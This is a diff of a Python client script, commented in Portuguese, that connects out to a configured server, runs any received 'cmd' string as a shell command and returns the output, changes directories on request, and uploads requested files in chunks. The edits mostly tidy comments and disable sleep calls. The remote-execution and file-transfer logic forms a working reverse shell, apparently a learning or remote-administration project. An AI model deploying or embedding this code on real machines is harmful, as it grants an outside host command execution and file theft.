@@ -22,19 +22,11 @@ if __name__ == "__main__":
 
     send_file = None
 
-    # Iniciando o seletor como padrão
+    # Iniciando nosso seletor padrão e Configurando o Socket
     sel = selectors.DefaultSelector()
-
-    # AF_INET: Formato (Host, Port)
-    # SOCK_STREAM: TCP
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Setando como não bloqueante
     soc.setblocking(False)
-
-    # Conectando
     soc.connect_ex((_HOST, _PORT))
-
     sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)
 
     while True:
@@ -45,69 +37,63 @@ if __name__ == "__main__":
             if mask & selectors.EVENT_READ:
                 entry = key.fileobj.recv(_MAX_MSG_SIZE)
                 entry = entry.decode()
+                
+                
+                
                 # Se não receber nada, fecha a conexão
                 if not entry:
-                    print("Fechando conexão: {}".format(key.fileobj))
-                    sel.unregister(key.fileobj)
-                    key.fileobj.close()
-                    # continue
-                    break
-
-                # Se o cliente não fechou a conexão, podemos tratar a mensagem
+                    print('Conexão com o servidor fechada...')
+                    sys.exit()
+                    
+                    
+                    
                 # Tratando se for msg
                 if entry[:3] == 'msg':
                     print(entry[3:])
                     soc.send(('Mensagem Recebida! >>> {}'.format(entry[3:])).encode())
-
+                    
+                    
+                    
                 # Tratando se for Comando
                 elif entry[:3] == 'cmd':
-                    print(entry)
+                    
+                    
+                    
                     # Reconhece o cmd copiar
                     if entry[3:6] == 'cpy':
                         caminho_arq = os.path.join(os.getcwd(), entry[6:len(entry)-1])
-
-                        # Criando um vetor [<arq>, <tam_arq>, <verdadeiro>]
-                        # Posição           0      1          2
                         send_file = [open(caminho_arq, 'rb'), os.path.getsize(caminho_arq), True]
 
-                        # soc.send(str(send_file[1]).encode())
-                
-                        #with open(caminho_arq, 'rb') as file:
-                        #    # Dividindo o Arquivo
-                        #    tam_arq = str(math.ceil(os.path.getsize(caminho_arq) / 512))
-                        #    while True:
-                        #        data = file.read(512)
-                        #        if not data:
-                        #            break
-                        #        soc.send('FIL{}'.format(data).encode())
-                        #        print('Arquivo {} Enviado!'.format(entry[6:]))
-                        #        continue
+                        
+                        
+                    # Retorna a pasta em que estamos
                     elif entry[3:] == 'cd':
                         soc.send(os.getcwd().encode())
                         continue
                     
-                    #elif len(entry) > 0:
-                        #saida = subprocess.getoutput(entry[3:])
-                        #print(saida)
-                        #soc.send(saida.encode())
-
+                    
+                    
+                    # Aqui ele navega nas pastas como se fosse o cliente 
                     elif entry[3:5] == 'cd':
-                        print('Comando do Servidor >>> {}'.format(entry[6:]))
                         os.chdir(entry[6:len(entry)-1])
                         soc.send((os.getcwd()).encode())
                         
+                        
+                        
+                    # Aqui ele trata tudo que sobrou como um comando
                     elif len(entry) > 0:
                         saida = subprocess.getoutput(entry[3:])
-                        print(saida)
                         soc.sendall(saida.encode())
-
                         
+                        
+                        
+            # Se o sistema estiver pronto para gravar ou enviar arquivos            
             elif mask & selectors.EVENT_WRITE:
                 if send_file:
                     if send_file[2]:
                         print('Enviando tamanho ... {}'.format(send_file[1]))
                         key.fileobj.send('FIL{:03d}'.format(send_file[1]).encode())
-                        time.sleep(1e-9)
+                        # time.sleep(1e-9)
                         send_file[2] = False
 
                     # Se o tamanho do arq for maior que 0
@@ -118,10 +104,9 @@ if __name__ == "__main__":
                             data = send_file[0].read(512)
                             m = 'FIL{:03d}'.format(len(data)).encode()
                             m = m + data
-                            # Enviando o pedaço do arqv
                             key.fileobj.send(m)
-                            time.sleep(1e-9)
-                            # Removendo o pedaço enviado do vetor
+                            # time.sleep(1e-9)
+                            # Removendo o pedaço enviado do tamanho do vetor
                             send_file[1] = send_file[1] - 512
                             
                         # se for menor envia direto
@@ -131,11 +116,12 @@ if __name__ == "__main__":
                             m = 'FIL{:03d}'.format(len(data)).encode()
                             m = m + data
                             key.fileobj.send(m)
-                            time.sleep(1e-9)
+                            # time.sleep(1e-9)
                             send_file[1] = 0
 
                         if send_file[1] == 0:
                             send_file[0].close()
+                            print('Arquivo Enviado!')
                         
         #print("[{}] {}".format(key.fileobj, entry))
         #soc.send(entry.encode())
